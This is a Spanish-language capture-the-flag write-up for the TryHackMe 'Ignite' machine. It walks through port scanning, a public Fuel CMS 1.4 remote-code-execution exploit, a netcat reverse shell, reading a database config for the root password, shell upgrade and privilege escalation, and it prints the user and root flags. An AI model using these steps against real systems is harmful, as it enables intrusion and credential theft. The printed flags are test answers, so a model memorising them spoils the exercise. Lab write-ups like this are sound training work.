# Writeup Ignite - TryHackMe

| **Información** | **Detalle** |
| :--- | :--- |
| **IP** | 10.128.181.160 |
| **Plataforma** | TryHackMe |
| **Sistema Operativo** | Linux |
| **Dificultad** | Fácil |

---

## Tabla de Contenidos

1. [Reconocimiento](#reconocimiento)
2. [Enumeración](#enumeración)
3. [Explotación](#explotación)
4. [Escalada de Privilegios](#escalada-de-privilegios)
5. [Flags](#flags)

---

## Reconocimiento

Lo primero que vamos a hacer, es un escaneo inicial de puertos, para saber que tenemos entre nuestras manos:


```bash
sudo nmap -sC -sV -Pn -sS -p- 10.128.181.160 -oN scan_ignite.txt
```
```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18
```
El escaneo revela una superficie de ataque inusualmente reducida, con únicamente el puerto 80 operativo. Procederemos a inspeccionar la aplicación web para identificar posibles vectores de entrada.

---

## Enumeración

Al entrar por la página web, podemos ver que es una plantilla de "Fuel CMS" de la versión 1.4, por lo que se apunta por si el útil en el futuro. Además en el robots.txt lleva a una carpeta llamada "fuel", que al entrar, es una página de login.

![pagina principal](/imgIgnite/image.png)

![pagina de login](/imgIgnite/image2.png)


Ahora, para buscar directorios ocultos, utilizaremos GoBuster.

```bash
gobuster dir -u http://[IP_ADDRESS] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,sh
```

*no hay nada interesante*

---

## Explotación

Al no encontrar nada interesante a la vista, hemos buscado la versión en searchsploit, y hemos encontrado una vulnerabilidad de RCE.

```bash
searchsploit fuel cms 1.4
```

![exploit en la base de datos](/imgIgnite/image3.png)

Al ejecutar el exploit contra la URL del servidor, se confirma la vulnerabilidad de ejecución remota de comandos (RCE). Hemos obtenido acceso inicial al sistema; no obstante, se trata de una shell no interactiva, lo que requiere una fase adicional para estabilizar la conexión.

![en la shell](/imgIgnite/image4.png)

Como es una shell muy limitada, podemos realizar una shell inversa hacia nuestra máquina usando revshells para generar la shell adecuada para la máquina. En los casos donde tenemos permisos muy limitados dentro de la shell inicial, es muy recomendado usar una shell inversa con mkfifo, ya que suele funcionar en la mayoría de los casos.

![generando shell](/imgIgnite/image5.png)


Ahora, en la máquina victima, simplemente tendremos que ejecutar el comando que nos proporciona revshells para obtener una shell reversa.

```bash
# Iniciamos el oyente en nuestra máquina (LPORT 4444)
nc -lvnp 4444
```

Al recibir la conexión, validamos nuestra identidad en el sistema:

```bash
connect to [192.168.130.81] from (UNKNOWN) [10.129.151.46] 39676
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
Vale, ya podremos navegar libremente por la máquina y encontrar la flag del usuario.

```bash
find / -type f -name flag.txt 2>/dev/null
/home/www-data/flag.txt 
$ cat /home/www-data/flag.txt
6470e394cbf6dab6a91682cc8585059b
```
---

## Escalada de Privilegios

Ahora que tenemos la flag de usuario, vamos a buscar la forma de subir de privilegios. Para ello, usaremos `sudo -l` para saber que podemos correr sin necesidad de usar contraseña.

```bash
sudo -l
sudo: no tty present and no askpass program specified
```
Al parecer no hay nada donde se pueda aprovechar. Vamos a intentar a buscar en la base de datos del sitio web para poder encontrar alguna contraseña que nos sirva para subir de privilegios.

```bash
pwd
/var/www/html/fuel/application/config
cat database.php
```

¡Bingo! Hemos encontrado una contraseña para el root del sitio web, que es "mememe". Ahora vamos a escalar de privilegios.

```bash
'password' => 'mememe',
```

Consejo: Si os da error al intentar subir de privilegios, es que la shell no es TTY, y nos impide subir de privilegios por seguridad. Se soluciona con un simple comando dentro de la máquina.

```bash
$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
$ pwd
/var/www/html/fuel/application/config
```

## Mejorar a la shell normal

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Y ya con la shell normal, por fín podremos acceder a la flag de root.

```bash
www-data@ubuntu:/var/www/html$ su root
su root
Password: mememe

root@ubuntu:/var/www/html# cat /root/root.txt
cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d
```
---

## Flags

- **User Flag**: 6470e394cbf6dab6a91682cc8585059b
- **Root Flag**: b9bbcb33e11b80be759c4e844862482d
